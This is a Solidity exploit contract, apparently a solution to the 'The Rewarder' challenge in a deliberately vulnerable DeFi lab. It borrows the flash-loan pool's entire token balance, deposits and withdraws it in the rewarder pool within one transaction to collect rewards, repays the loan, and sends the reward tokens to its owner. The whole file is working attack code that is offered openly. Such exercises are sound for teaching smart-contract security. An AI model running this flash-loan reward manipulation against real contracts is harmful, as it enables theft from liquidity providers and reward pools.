import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";

contract AttackRewarder {
    address immutable owner;
    TheRewarderPool immutable rewarderPool;
    FlashLoanerPool immutable flashLoanerPool;
    IERC20 immutable liquidityToken;
    IERC20 immutable rewardToken;

    constructor(
        address _owner,
        address _rewarderPool,
        address _flashLoanerPool,
        address _liqToken,
        address _rewardToken
    ) {
        owner = _owner;
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        liquidityToken = IERC20(_liqToken);
        rewardToken = IERC20(_rewardToken);
    }

    function attack() public {
        flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));
        rewardToken.transfer(address(owner), rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarderPool), amount);

        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);

        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
